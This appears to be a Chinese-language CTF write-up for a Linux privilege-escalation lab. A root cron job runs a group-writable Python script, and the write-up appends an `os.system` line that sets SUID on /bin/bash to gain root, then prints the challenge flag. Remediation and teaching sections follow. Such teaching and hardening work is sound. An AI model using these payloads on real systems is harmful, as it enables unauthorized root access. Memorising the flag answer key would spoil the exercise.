### 1.3 关键配置（实测）

| 路径 | 权限 / 内容 |
| --- | --- |
| `/flag.txt` | `-r-------- root root` | 构建时由题目目录的 `flag.txt` 写入，每题固定 |
| `/opt/monitor/supervisor.py` | `-rw-rw-r-- 1 root web`（664）—— **root 执行、web 组可写** |
| `/opt/monitor/app.py` | `-rw-r--r-- root root`（只读数据，脚本会 `python3 app.py` 执行它） |
| `/opt/monitor`（目录） | `drwxr-xr-x root root`（不可写，不能删/换脚本） |
| `/etc/cron.d/monitor` | `* * * * * root /usr/bin/python3 /opt/monitor/supervisor.py`（644 root） |
| `/var/log/monitor` | `755 root`；`supervisor.log` 由 root 创建，0644 可读 |
| 现存 SUID | 只有系统自带十项（`su`、`passwd`、`mount`、`sudo` 等），无预置异常 |
| `player` 的 sudo | `player is not in the sudoers file` |

`supervisor.py` 的实际逻辑：写一行 `checking monitor app` → 以 `subprocess.run(["/usr/bin/python3", APP])` 跑被监督的 app → 写一行 `supervisor done`。

## 二、题目考点

1. **“文件负责人”和“执行者”不一致**：文件写给 `web` 组维护（`664 root:web`），但执行者是 root。
2. **服务脚本就是代码执行点**：`python3 /opt/monitor/supervisor.py` 每次执行都会读整个文件，追加一行 `os.system(...)` 等价于以 root 执行任意命令。
3. **同类真实场景**：`/usr/local/bin/*.py` 属组 www-data、systemd `ExecStart=` 指向用户可写路径、`logrotate` 的 `postrotate` 脚本可写。
4. **权限三分法再看一次**：目录 755 挡住“替换/新建”，文件 664 放开“追加”，两者组合就是只能改内容。
5. **落地手段**：`chmod 4755 /bin/bash` → `bash -p`；也可以 `cp /flag.txt /tmp` 或用 python 直接 `chmod`。

## 三、解题过程

### 3.1 第一步：看 root 在跑什么

```bash
cat /etc/cron.d/monitor
# * * * * * root /usr/bin/python3 /opt/monitor/supervisor.py

ls -la /opt/monitor/
# drwxr-xr-x root root .
# -rw-r--r-- root root   33 app.py           <-- 只读
# -rw-rw-r-- root web   583 supervisor.py    <-- 组可写
```

`id` 显示 `groups=1001(player),996(web)`，正好落在 `web` 组里。

### 3.2 第二步：确认“正常行为”，建立对照

```bash
tail -4 /var/log/monitor/supervisor.log
# [2026-11-18 08:24:01] checking monitor app
# [2026-11-18 08:24:01] supervisor done
# [2026-11-18 08:25:01] checking monitor app
# [2026-11-18 08:25:01] supervisor done
```

每分钟一对日志，说明 root 真的在跑这份脚本；日志可读，是玩家判断“已执行”的信号。

接着排掉所有“直接改”的路：

| 尝试 | 结果 |
| --- | --- |
| `echo x >> /opt/monitor/app.py` | Permission denied |
| `echo x >> /etc/cron.d/monitor` | Permission denied |
| `mv /opt/monitor/supervisor.py /tmp/` | Permission denied |
| `touch /opt/monitor/new.py` | Permission denied |
| `touch /var/log/monitor/x.log` | Permission denied |
| `sudo -S id` | not in the sudoers file |

### 3.3 第三步：往监督脚本追加一行

```bash
echo 'import os; os.system("chmod 4755 /bin/bash")' >> /opt/monitor/supervisor.py

tail -2 /opt/monitor/supervisor.py
#     main()
# import os; os.system("chmod 4755 /bin/bash")

ls -l /bin/bash
# -rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash      <-- 还没有 s
```

### 3.4 第四步：等 cron，取 root

```bash
tail -2 /var/log/monitor/supervisor.log
# [2026-11-18 08:26:01] checking monitor app
# [2026-11-18 08:26:01] supervisor done

ls -l /bin/bash
# -rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash      <-- SUID 已生效

/bin/bash -p -c 'id; cat /flag.txt'
# uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player),996(web)
# Ly_Flag{tensgvco}
```

### 4.3 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

```bash
docker exec lx05 stat -c '%a %U:%G' /flag.txt   # 400 root:root
docker exec lx05 cat /flag.txt                    # Ly_Flag{tensgvco}
```

注意：flag 在构建时就写进镜像层，`docker save` 出来的 tar 同样带着它；若镜像/tar 会发给选手，
等于直接送出 flag，这种情况下应改为运行时挂载或环境变量注入。

## 六、修复建议

1. **脚本归属与执行者对齐**：`chown root:root /opt/monitor/supervisor.py && chmod 755`（或 700）。协作通过代码评审/流水线发布，而不是放开组写。
2. **服务定义别指向可写路径**：systemd/cron 里的 `ExecStart`、`Command` 一律指向 root 独占目录；`/opt/*`、`/usr/local/*` 下不要出现组可写或全局可写文件。
3. **进程降权**：监督脚本本身只需读日志、跑子进程，可用 `systemd` 的 `User=`/`NoNewPrivileges=true`/`ProtectSystem=strict` 把影响面压到最小；真需要 root 时也应 `CapabilityBoundingSet` 收窄。
4. **审计基线**：`find / -xdev -type f -group web -perm -0020`、`find / -xdev -type f -user root -perm -o+w` 定期比对；对本目录加 `auditd` 写监控（`-w /opt/monitor -p wa`）。
5. **构建侧**：`FROM ubuntu:24.04` 未固定 digest，建议固定 sha256 并使用版本标签。

## 七、教学要点

1. 这里的漏洞不是“文件权限配错一个位”，而是**职责边界错了**：写的人不该有执行权。
2. `python3 xxx.py` 由 root 执行时，文件内容就是 root 代码；追加一行与整篇重写等价。
3. 目录 755 + 文件 664 的组合，说明出题人刻意保留“只能追加”——这也是真实运维里最常见的情形（不能换文件，但能改内容）。
4. payload 不限于 `chmod +s`：`os.system("cp /flag.txt /tmp/flag")`、写 `authorized_keys`、`os.setuid(0)` 后起 shell 都行。
5. 对照记忆：第 3 题是 shell 脚本 + 组可写（cron 直接执行），第 5 题是 python 服务脚本 + 组可写（cron 用解释器执行），本质同源，表现不同。
